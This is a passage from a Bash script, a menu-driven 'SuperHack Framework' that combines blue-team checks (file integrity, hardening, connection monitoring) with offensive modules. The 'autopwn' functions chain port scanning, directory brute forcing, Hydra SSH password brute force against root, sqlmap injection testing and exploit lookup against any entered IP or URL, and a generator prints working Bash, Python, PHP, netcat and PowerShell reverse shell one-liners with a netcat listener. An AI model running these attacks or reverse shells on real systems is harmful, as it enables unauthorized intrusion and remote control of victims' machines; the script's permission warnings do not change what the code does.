    timestamp=$(date +%Y%m%d_%H%M%S)
    local baseline_file="$RESULTS_DIR/blueteam/baseline_${dir_path//\//_}_$timestamp.txt"
    local current_file="$RESULTS_DIR/blueteam/current_${dir_path//\//_}_$timestamp.txt"
    
    echo "1) Create baseline"
    echo "2) Check against existing baseline"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read choice
    
    [[ "$choice" == "0" ]] && return
    
    if [[ "$choice" == "1" ]]; then
        echo -e "${YELLOW}[*] Creating baseline...${NC}"
        find "$dir_path" -type f -exec sha256sum {} \; > "$baseline_file" 2>/dev/null
        echo -e "${GREEN}[+] Baseline saved to: $baseline_file${NC}"
        echo "Keep this file secure for future integrity checks."
    elif [[ "$choice" == "2" ]]; then
        echo -n "Enter baseline file path: "
        read baseline
        
        [[ ! -f "$baseline" ]] && echo -e "${RED}[!] Baseline file not found${NC}" && return
        
        echo -e "${YELLOW}[*] Checking integrity...${NC}"
        find "$dir_path" -type f -exec sha256sum {} \; > "$current_file" 2>/dev/null
        
        local diff_output=$(diff "$baseline" "$current_file")
        
        if [[ -z "$diff_output" ]]; then
            echo -e "${GREEN}[+] No changes detected. Integrity verified.${NC}"
        else
            echo -e "${RED}[!] CHANGES DETECTED:${NC}"
            echo "$diff_output"
            echo ""
            echo -e "${YELLOW}[*] Added files:${NC}"
            comm -13 <(sort "$baseline" | awk '{print $2}') <(sort "$current_file" | awk '{print $2}')
            echo ""
            echo -e "${YELLOW}[*] Modified files:${NC}"
            comm -12 <(sort "$baseline" | awk '{print $2}') <(sort "$current_file" | awk '{print $2}') | while read f; do
                grep "$f" "$baseline" > /tmp/baseline_hash 2>/dev/null
                grep "$f" "$current_file" > /tmp/current_hash 2>/dev/null
                diff /tmp/baseline_hash /tmp/current_hash > /dev/null || echo "$f"
            done
        fi
        
        rm -f "$current_file"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

network_monitor() {
    echo -e "${BLUE}[*] Network Connection Monitor${NC}"
    
    echo "1) Show active connections"
    echo "2) Monitor connections in real-time"
    echo "3) Show listening ports"
    echo "4) Show established connections"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read choice
    
    [[ "$choice" == "0" ]] && return
    
    case $choice in
        1)
            echo -e "${CYAN}=== Active Connections ===${NC}"
            netstat -tulpn 2>/dev/null || ss -tulpn
            ;;
        2)
            echo -e "${YELLOW}[*] Monitoring connections (Ctrl+C to stop)...${NC}"
            watch -n 1 'netstat -tulpn 2>/dev/null || ss -tulpn'
            ;;
        3)
            echo -e "${CYAN}=== Listening Ports ===${NC}"
            netstat -tlnp 2>/dev/null || ss -tlnp
            ;;
        4)
            echo -e "${CYAN}=== Established Connections ===${NC}"
            netstat -tnp 2>/dev/null | grep ESTABLISHED || ss -tnp | grep ESTAB
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

hardening_check() {
    echo -e "${BLUE}[*] System Hardening Check${NC}"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local report_file="$RESULTS_DIR/blueteam/hardening_$timestamp.txt"
    
    echo "System Hardening Report - $(date)" | tee "$report_file"
    echo "================================" | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    
    # Check SSH settings
    echo "--- SSH Configuration ---" | tee -a "$report_file"
    if [[ -f /etc/ssh/sshd_config ]]; then
        grep -E "^PermitRootLogin|^PasswordAuthentication|^Port" /etc/ssh/sshd_config | tee -a "$report_file"
    else
        echo "SSH config not found" | tee -a "$report_file"
    fi
    echo "" | tee -a "$report_file"
    
    # Check firewall status
    echo "--- Firewall Status ---" | tee -a "$report_file"
    ufw status 2>/dev/null | head -5 | tee -a "$report_file" || \
    iptables -L -n 2>/dev/null | head -10 | tee -a "$report_file" || \
    echo "No firewall detected" | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    
    # Check for unnecessary services
    echo "--- Running Services ---" | tee -a "$report_file"
    systemctl list-units --type=service --state=running 2>/dev/null | head -20 | tee -a "$report_file" || \
    service --status-all 2>/dev/null | grep + | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    
    # Check for SUID files
    echo "--- SUID Files (potential privilege escalation) ---" | tee -a "$report_file"
    find / -perm -4000 -type f 2>/dev/null | head -20 | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    
    # Check for world-writable files
    echo "--- World-Writable Files ---" | tee -a "$report_file"
    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) 2>/dev/null | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    
    # Check users
    echo "--- User Accounts ---" | tee -a "$report_file"
    awk -F: '$3 >= 1000 {print $1}' /etc/passwd | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    echo "Users with no password:" | tee -a "$report_file"
    awk -F: '($2 == "") {print $1}' /etc/shadow 2>/dev/null | tee -a "$report_file" || echo "None found" | tee -a "$report_file"
    
    echo "" | tee -a "$report_file"
    echo "--- Kernel Parameters ---" | tee -a "$report_file"
    sysctl -a 2>/dev/null | grep -E "rp_filter|syncookies|redirect" | tee -a "$report_file"
    
    echo "" | tee -a "$report_file"
    echo -e "${GREEN}[+] Hardening report saved to: $report_file${NC}"
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# AUTOPWN MODULE
# =============================================================================

autopwn_menu() {
    echo -e "${CYAN}"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════╗
    ║              AUTOPWN - AUTOMATED EXPLOITATION             ║
    ╚═══════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    
    echo "1) Autopwn IP Address"
    echo "2) Autopwn URL/Domain"
    echo "0) Back to Main Menu"
    echo ""
    echo -n "Select option: "
    read choice
    
    case $choice in
        1) autopwn_ip ;;
        2) autopwn_url ;;
        0) return ;;
        *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
    esac
}

autopwn_ip() {
    echo -e "${BLUE}[*] Autopwn IP Address${NC}"
    echo -n "Enter target IP: "
    read target_ip
    
    [[ -z "$target_ip" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local report_dir="$RESULTS_DIR/autopwn/ip_${target_ip//./_}_$timestamp"
    create_dir "$report_dir"
    
    echo -e "${YELLOW}[*] Starting automated exploitation against $target_ip${NC}"
    echo -e "${RED}[!] WARNING: Only use against systems you own or have permission to test!${NC}"
    echo -n "Continue? (y/n): "
    read confirm
    [[ "$confirm" != "y" ]] && return
    
    # Step 1: Port Scan
    echo ""
    echo "[1/6] Running port scan..."
    nmap -sS -sV -O -p- --open "$target_ip" -oA "$report_dir/nmap_full" 2>/dev/null || \
    nmap -sT -sV -p- --open "$target_ip" -oA "$report_dir/nmap_full" 2>/dev/null
    
    # Parse open ports
    local open_ports=$(grep -oP '\d+/open' "$report_dir/nmap_full.nmap" 2>/dev/null | cut -d'/' -f1 | tr '\n' ',')
    [[ -z "$open_ports" ]] && open_ports="1-65535"
    
    echo "Open ports: $open_ports"
    
    # Step 2: Service enumeration
    echo ""
    echo "[2/6] Running service enumeration..."
    
    # Check for web services
    if grep -q "80/open\|443/open\|8080/open\|8443/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
        echo "  [*] Web services detected, running web enumeration..."
        nikto -h "$target_ip" -output "$report_dir/nikto.txt" 2>/dev/null || true
        
        # Gobuster if wordlists exist
        if [[ -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" ]]; then
            gobuster dir -u "http://$target_ip" -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
                -o "$report_dir/directories.txt" -t 50 2>/dev/null || true
        fi
    fi
    
    # Check for SMB
    if grep -q "445/open\|139/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
        echo "  [*] SMB detected, running enumeration..."
        enum4linux-ng -A "$target_ip" -oA "$report_dir/smb_enum" 2>/dev/null || \
        enum4linux -a "$target_ip" > "$report_dir/smb_enum.txt" 2>/dev/null || true
    fi
    
    # Check for SSH
    if grep -q "22/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
        echo "  [*] SSH detected, checking for weak credentials..."
        hydra -l root -P "$WORDLISTS_DIR/rockyou.txt" "$target_ip" ssh -t 4 -o "$report_dir/ssh_brute.txt" 2>/dev/null || true
    fi
    
    # Check for FTP
    if grep -q "21/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
        echo "  [*] FTP detected, checking for anonymous access..."
        echo "anonymous" | ftp -n "$target_ip" > "$report_dir/ftp_anon.txt" 2>&1 || true
    fi
    
    # Step 3: Vulnerability scan
    echo ""
    echo "[3/6] Running vulnerability scan..."
    if command -v nmap &>/dev/null; then
        nmap --script vuln -p "$open_ports" "$target_ip" -oN "$report_dir/vuln_scan.txt" 2>/dev/null || true
    fi
    
    # Step 4: Search for exploits
    echo ""
    echo "[4/6] Searching for exploits..."
    local services=$(grep -oP '([a-zA-Z0-9_-]+) [0-9.]+' "$report_dir/nmap_full.nmap" 2>/dev/null | head -10)
    for service in $services; do
        searchsploit "$service" 2>/dev/null | head -5 >> "$report_dir/exploits.txt" || true
    done
    
    # Step 5: Generate report
    echo ""
    echo "[5/6] Generating report..."
    cat > "$report_dir/AUTOPWN_REPORT.txt" << EOF
AUTOPWN REPORT
==============
Target: $target_ip
Date: $(date)
Scan ID: $timestamp

=== OPEN PORTS ===
$(grep -E "^[0-9]+/open" "$report_dir/nmap_full.nmap" 2>/dev/null || echo "See nmap_full.nmap")

=== SERVICES ===
$(grep -E "^[0-9]+/(tcp|udp)" "$report_dir/nmap_full.nmap" 2>/dev/null || echo "See nmap_full.nmap")

=== FILES GENERATED ===
$(ls -la "$report_dir/")

=== NEXT STEPS ===
1. Review nmap_full.nmap for service versions
2. Check smb_enum for share access
3. Review vuln_scan.txt for vulnerabilities
4. Check exploits.txt for potential exploits
5. If web services found, check directories.txt for hidden paths
EOF

    echo ""
    echo "[6/6] Complete!"
    echo -e "${GREEN}[+] Autopwn complete! Report saved to: $report_dir/AUTOPWN_REPORT.txt${NC}"
    cat "$report_dir/AUTOPWN_REPORT.txt"
    
    echo -n "Press Enter to continue..."
    read
}

autopwn_url() {
    echo -e "${BLUE}[*] Autopwn URL/Domain${NC}"
    echo -n "Enter target URL (e.g., http://target.com): "
    read target_url
    
    [[ -z "$target_url" ]] && return
    
    # Ensure URL has protocol
    [[ ! "$target_url" =~ ^http ]] && target_url="http://$target_url"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local domain=$(echo "$target_url" | sed -E 's|https?://||' | cut -d'/' -f1)
    local report_dir="$RESULTS_DIR/autopwn/url_${domain}_$timestamp"
    create_dir "$report_dir"
    
    echo -e "${YELLOW}[*] Starting automated web exploitation against $target_url${NC}"
    echo -e "${RED}[!] WARNING: Only use against systems you own or have permission to test!${NC}"
    echo -n "Continue? (y/n): "
    read confirm
    [[ "$confirm" != "y" ]] && return
    
    # Step 1: Initial recon
    echo ""
    echo "[1/7] Running initial reconnaissance..."
    curl -s -I "$target_url" > "$report_dir/headers.txt" 2>&1 || true
    whatweb "$target_url" > "$report_dir/whatweb.txt" 2>&1 || true
    
    # Step 2: DNS/Domain info
    echo ""
    echo "[2/7] Gathering DNS information..."
    host "$domain" > "$report_dir/dns.txt" 2>&1 || true
    host -t mx "$domain" >> "$report_dir/dns.txt" 2>&1 || true
    whois "$domain" > "$report_dir/whois.txt" 2>&1 || true
    
    # Step 3: Subdomain enumeration
    echo ""
    echo "[3/7] Enumerating subdomains..."
    for sub in www mail ftp admin portal api dev test staging shop blog; do
        host "$sub.$domain" >> "$report_dir/subdomains.txt" 2>&1 &
    done
    wait
    
    # Step 4: Directory brute force
    echo ""
    echo "[4/7] Brute forcing directories..."
    if [[ -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" ]]; then
        gobuster dir -u "$target_url" -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
            -o "$report_dir/directories.txt" -t 50 -x php,txt,html,bak 2>/dev/null || \
        dirb "$target_url" "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
            -o "$report_dir/directories.txt" 2>/dev/null || true
    fi
    
    # Step 5: Vulnerability scan
    echo ""
    echo "[5/7] Running vulnerability scan..."
    nikto -h "$target_url" -output "$report_dir/nikto.txt" 2>/dev/null || true
    
    # Check for SQL injection
    echo "  [*] Testing for SQL injection..."
    sqlmap -u "$target_url" --batch --forms --crawl=2 --level=1 --risk=1 \
        -o "$report_dir/sqlmap.txt" 2>/dev/null || true
    
    # Step 6: SSL/TLS scan if HTTPS
    if [[ "$target_url" =~ ^https ]]; then
        echo ""
        echo "[6/7] Scanning SSL/TLS..."
        nmap --script ssl-enum-ciphers -p 443 "$domain" -oN "$report_dir/ssl_scan.txt" 2>/dev/null || true
        sslyze "$target_url" > "$report_dir/sslyze.txt" 2>/dev/null || true
    fi
    
    # Step 7: Generate report
    echo ""
    echo "[7/7] Generating report..."
    cat > "$report_dir/WEB_AUTOPWN_REPORT.txt" << EOF
WEB AUTOPWN REPORT
==================
Target: $target_url
Domain: $domain
Date: $(date)
Scan ID: $timestamp

=== HTTP HEADERS ===
$(cat "$report_dir/headers.txt" 2>/dev/null || echo "Not available")

=== DNS INFO ===
$(cat "$report_dir/dns.txt" 2>/dev/null || echo "Not available")

=== SUBDOMAINS ===
$(grep "has address" "$report_dir/subdomains.txt" 2>/dev/null || echo "None found")

=== DIRECTORIES FOUND ===
$(cat "$report_dir/directories.txt" 2>/dev/null | head -30 || echo "See directories.txt")

=== VULNERABILITIES (Nikto) ===
$(grep -E "OSVDB|CVE" "$report_dir/nikto.txt" 2>/dev/null | head -20 || echo "See nikto.txt")

=== FILES GENERATED ===
$(ls -la "$report_dir/")

=== NEXT STEPS ===
1. Review directories.txt for interesting paths
2. Check nikto.txt for vulnerabilities
3. Review sqlmap.txt for SQL injection findings
4. If SSL scan present, check for weak ciphers
5. Test discovered endpoints manually
EOF

    echo -e "${GREEN}[+] Web autopwn complete! Report saved to: $report_dir/WEB_AUTOPWN_REPORT.txt${NC}"
    cat "$report_dir/WEB_AUTOPWN_REPORT.txt"
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# INFO MODULE
# =============================================================================

info_menu() {
    while true; do
        echo -e "${CYAN}"
        cat << "EOF"
    ╔═══════════════════════════════════════════════════════════╗
    ║              INFORMATION & HELP                           ║
    ╚═══════════════════════════════════════════════════════════╝
EOF
        echo -e "${NC}"
        
        echo "1) Framework Information"
        echo "2) Tool Descriptions"
        echo "3) Usage Guidelines"
        echo "4) Legal Disclaimer"
        echo "5) System Information"
        echo "6) View Logs"
        echo "0) Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read info_choice
        
        case $info_choice in
            1) framework_info ;;
            2) tool_descriptions ;;
            3) usage_guidelines ;;
            4) legal_disclaimer ;;
            5) system_info ;;
            6) view_logs ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

framework_info() {
    echo -e "${BLUE}[*] Framework Information${NC}"
    echo ""
    echo "SuperHack Framework v$VERSION"
    echo "======================="
    echo ""
    echo "Configuration Directory: $CONFIG_DIR"
    echo "Log Directory: $LOG_DIR"
    echo "Wordlists Directory: $WORDLISTS_DIR"
    echo "Results Directory: $RESULTS_DIR"
    echo ""
    echo "Installed Tools:"
    for tool in nmap metasploit-framework hydra gobuster aircrack-ng john hashcat sqlmap nikto; do
        if command -v "$tool" &>/dev/null; then
            local version=$($tool --version 2>/dev/null | head -1 || echo "installed")
            echo "  [+] $tool: $version"
        else
            echo "  [-] $tool: not installed"
        fi
    done
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

tool_descriptions() {
    echo -e "${BLUE}[*] Tool Descriptions${NC}"
    echo ""
    echo "=== Network Scanning ==="
    echo "Nmap         - Port scanner and network discovery"
    echo "Masscan      - High-speed port scanner"
    echo ""
    echo "=== Enumeration ==="
    echo "Enum4linux   - SMB enumeration for Windows"
    echo "Gobuster     - Directory/file brute forcer"
    echo "Nikto        - Web vulnerability scanner"
    echo ""
    echo "=== Exploitation ==="
    echo "Metasploit   - Exploitation framework"
    echo "SQLMap       - SQL injection automation"
    echo "Hydra        - Login brute forcer"
    echo ""
    echo "=== Wireless ==="
    echo "Aircrack-ng  - WiFi security auditing"
    echo "Reaver       - WPS PIN attack tool"
    echo ""
    echo "=== Password Cracking ==="
    echo "John         - Password hash cracker"
    echo "Hashcat      - GPU-accelerated hash cracker"
    echo ""
    echo "=== OSINT ==="
    echo "theHarvester - Email harvesting"
    echo "Shodan       - Internet device search"
    echo ""
    echo "=== Blue Team ==="
    echo "ClamAV       - Antivirus scanner"
    echo "rkhunter     - Rootkit detector"
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

usage_guidelines() {
    echo -e "${BLUE}[*] Usage Guidelines${NC}"
    echo ""
    echo "1. ALWAYS obtain written permission before testing"
    echo "2. Document all activities and findings"
    echo "3. Respect scope boundaries"
    echo "4. Do not exfiltrate sensitive data"
    echo "5. Report vulnerabilities responsibly"
    echo "6. Maintain confidentiality of findings"
    echo ""
    echo "Workflow:"
    echo "1. Reconnaissance (OSINT, scanning)"
    echo "2. Enumeration (services, shares, users)"
    echo "3. Vulnerability Assessment"
    echo "4. Exploitation (with authorization)"
    echo "5. Post-Exploitation"
    echo "6. Reporting"
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

legal_disclaimer() {
    echo -e "${RED}"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════╗
    ║                    LEGAL DISCLAIMER                       ║
    ╚═══════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo ""
    echo "This framework is for AUTHORIZED security testing only."
    echo ""
    echo "Unauthorized access to computer systems is illegal under:"
    echo "  - Computer Fraud and Abuse Act (US)"
    echo "  - Computer Misuse Act (UK)"
    echo "  - Similar laws in your jurisdiction"
    echo ""
    echo "Users are responsible for:"
    echo "  - Obtaining proper authorization"
    echo "  - Complying with applicable laws"
    echo "  - Using tools ethically and responsibly"
    echo ""
    echo "The authors assume NO liability for misuse or damage."
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# POST-EXPLOITATION & UTILITIES
# =============================================================================

# Network listener/ncat wrapper
network_listener() {
    check_install netcat-traditional nc
    echo -e "${BLUE}[*] Network Listener${NC}"
    
    echo -n "Enter port to listen on: "
    read listen_port
    [[ -z "$listen_port" ]] && return
    
    echo -n "Save output to file? (y/n): "
    read save_output
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -e "${YELLOW}[*] Starting listener on port $listen_port...${NC}"
    echo -e "${RED}[!] Run this in another terminal if you need to continue using this menu:${NC}"
    echo -e "${CYAN}nc -lvp $listen_port${NC}"
    echo ""
    echo -n "Start listener now? (y/n): "
    read start_now
    
    if [[ "$start_now" == "y" ]]; then
        if [[ "$save_output" == "y" ]]; then
            local output_file="$RESULTS_DIR/netcat_listener_$timestamp.txt"
            echo -e "${YELLOW}[*] Listening... (Ctrl+C to stop)${NC}"
            nc -lvp "$listen_port" | tee "$output_file"
            echo -e "${GREEN}[+] Output saved to: $output_file${NC}"
        else
            echo -e "${YELLOW}[*] Listening... (Ctrl+C to stop)${NC}"
            nc -lvp "$listen_port"
        fi
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Quick reverse shell generator
quick_reverse_shell() {
    echo -e "${BLUE}[*] Quick Reverse Shell Generator${NC}"
    
    echo -n "Enter your IP (LHOST): "
    read lhost
    [[ -z "$lhost" ]] && return
    
    echo -n "Enter port (LPORT): "
    read lport
    
    echo ""
    echo -e "${CYAN}=== Bash ===${NC}"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo ""
    echo -e "${CYAN}=== Python ===${NC}"
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo -e "${CYAN}=== PHP ===${NC}"
    echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo ""
    echo -e "${CYAN}=== Netcat ===${NC}"
    echo "nc -e /bin/sh $lhost $lport"
    echo ""
    echo -e "${CYAN}=== PowerShell ===${NC}"
    echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    echo ""
    
    echo -n "Start listener now? (y/n): "
    read start_listener
    if [[ "$start_listener" == "y" ]]; then
        echo -e "${YELLOW}[*] Starting listener...${NC}"
        echo -e "${RED}[!] This will block the terminal. Run in another terminal to continue:${NC}"
        echo -e "${CYAN}nc -lvp $lport${NC}"
        echo ""
        echo -n "Press Enter to start listener (Ctrl+C to stop)..."
        read
        nc -lvp "$lport"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Log viewer
view_logs() {
    echo -e "${BLUE}[*] Session Logs${NC}"
    
    if [[ ! -d "$LOG_DIR" ]] || [[ -z "$(ls -A "$LOG_DIR" 2>/dev/null)" ]]; then
        echo -e "${YELLOW}[!] No logs found${NC}"
    else
        echo "Available logs:"
        ls -la "$LOG_DIR"/*.log 2>/dev/null || echo "No .log files found"
        echo ""
        echo -n "View log file (enter filename or 'all'): "
        read log_file
        
        if [[ "$log_file" == "all" ]]; then
            for f in "$LOG_DIR"/*.log; do
                [[ -f "$f" ]] && echo -e "\n=== $f ===" && cat "$f"
            done
        elif [[ -f "$LOG_DIR/$log_file" ]]; then
            cat "$LOG_DIR/$log_file"
        fi
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# System information
system_info() {
    echo -e "${BLUE}[*] System Information${NC}"
    echo ""
    echo -e "${CYAN}=== OS Information ===${NC}"
    uname -a
    echo ""
    echo -e "${CYAN}=== Network Interfaces ===${NC}"
    ip addr show 2>/dev/null || ifconfig -a
    echo ""
    echo -e "${CYAN}=== Routing Table ===${NC}"
    ip route 2>/dev/null || route -n
    echo ""
    echo -e "${CYAN}=== Wireless Interfaces ===${NC}"
    iw dev 2>/dev/null || echo "No wireless interfaces found"
    echo ""
    echo -e "${CYAN}=== Disk Usage ===${NC}"
    df -h "$CONFIG_DIR"
    echo ""
    echo -e "${CYAN}=== Memory ===${NC}"
    free -h 2>/dev/null || cat /proc/meminfo | head -3
    
    echo -n "Press Enter to continue..."
    read
}

# Update framework
update_framework() {
    echo -e "${BLUE}[*] Updating SuperHack Framework${NC}"
    
    echo -e "${YELLOW}[*] Updating package lists...${NC}"
    apt-get update -qq
    
    echo -e "${YELLOW}[*] Upgrading installed packages...${NC}"
    apt-get upgrade -y
    
    echo -e "${YELLOW}[*] Updating wordlists...${NC}"
    if [[ -d "$WORDLISTS_DIR/seclists/.git" ]]; then
        cd "$WORDLISTS_DIR/seclists" && git pull
    fi
    
    echo -e "${GREEN}[+] Update complete!${NC}"
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# MAIN MENU & EXECUTION
# =============================================================================

# Display main menu
main_menu() {
    while true; do
        show_banner
        echo ""
        echo -e "${GREEN}  [1]${NC} Network Scanning        ${GREEN}[7]${NC}  Phishing Tools"
        echo -e "${GREEN}  [2]${NC} Enumeration             ${GREEN}[8]${NC}  Wireless Attacks"
        echo -e "${GREEN}  [3]${NC} Brute Force             ${GREEN}[9]${NC}  Utilities"
        echo -e "${GREEN}  [4]${NC} Payload Generation      ${GREEN}[10]${NC} System"
        echo -e "${GREEN}  [5]${NC} Exploit Database        ${GREEN}[11]${NC} OSINT"
        echo -e "${GREEN}  [6]${NC} Password Cracking       ${GREEN}[12]${NC} Blue Team"
        echo ""
        echo -e "${MAGENTA}  [A]${NC} Autopwn (Auto Exploit)"
        echo -e "${MAGENTA}  [I]${NC} Information/Help"
        echo ""
        echo -e "${YELLOW}  [0] Exit Framework${NC}"
        echo ""
        echo -n "Select option: "
        read menu_choice
        
        case $menu_choice in
            1)
                while true; do
                    echo ""
                    echo -e "${CYAN}=== NETWORK SCANNING ===${NC}"
                    echo "1) Advanced Nmap Scanner"
                    echo "2) Network Discovery (Ping Sweep)"
                    echo "3) Quick Port Scanner"
                    echo "0) Back to Main Menu"
                    echo -n "Choice: "
                    read scan_choice
                    case $scan_choice in
                        1) advanced_nmap_scan ;;
                        2) network_discovery ;;
                        3) port_scanner ;;
                        0) break ;;
                    esac
                done
                ;;
            2)
                while true; do
                    echo ""
                    echo -e "${CYAN}=== ENUMERATION ===${NC}"
                    echo "1) SMB Enumeration"
                    echo "2) LDAP/AD Enumeration"
                    echo "3) Web Enumeration"
                    echo "4) Subdomain Enumeration"
                    echo "0) Back to Main Menu"
                    echo -n "Choice: "
                    read enum_choice
                    case $enum_choice in
                        1) smb_enum ;;
                        2) ldap_enum ;;
                        3) web_enum ;;
                        4) subdomain_enum ;;
                        0) break ;;
                    esac
                done
                ;;
            3) brute_force ;;
            4) payload_gen ;;
            5) exploit_search ;;
            6) password_crack ;;
            7) phishing_menu ;;
            8) wifi_attacks ;;
            9)
                while true; do
                    echo ""
                    echo -e "${CYAN}=== UTILITIES ===${NC}"
                    echo "1) Network Listener"
                    echo "2) Quick Reverse Shell"
                    echo "3) View Logs"
                    echo "0) Back to Main Menu"
                    echo -n "Choice: "
                    read util_choice
                    case $util_choice in
                        1) network_listener ;;
                        2) quick_reverse_shell ;;
                        3) view_logs ;;
                        0) break ;;
                    esac
                done
                ;;
            10)
                while true; do
                    echo ""
                    echo -e "${CYAN}=== SYSTEM ===${NC}"
                    echo "1) System Information"
                    echo "2) Update Framework"
                    echo "3) Initialize Directories"
                    echo "4) Package Manager"
                    echo "0) Back to Main Menu"
                    echo -n "Choice: "
                    read sys_choice
                    case $sys_choice in
                        1) system_info ;;
                        2) update_framework ;;
                        3) init_dirs ;;
                        4) smart_package_manager ;;
                        0) break ;;
                    esac
                done
                ;;
            11) osint_menu ;;
            12) blueteam_menu ;;
            [Aa]) autopwn_menu ;;
            [Ii]) info_menu ;;
            0)
                echo -e "${GREEN}[+] Exiting SuperHack Framework${NC}"
                echo -e "${YELLOW}[*] Goodbye!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# =============================================================================
# SCRIPT ENTRY POINT
# =============================================================================

# Initialize log file
LOG_FILE="$LOG_DIR/superhack_$(date +%Y%m%d_%H%M%S).log"

# Redirect all output to log file as well as terminal
exec > >(tee -a "$LOG_FILE") 2>&1

# Show startup banner
show_banner

# Initialize directories
init_dirs

# Check and install missing packages
smart_package_manager

# Start main menu
main_menu
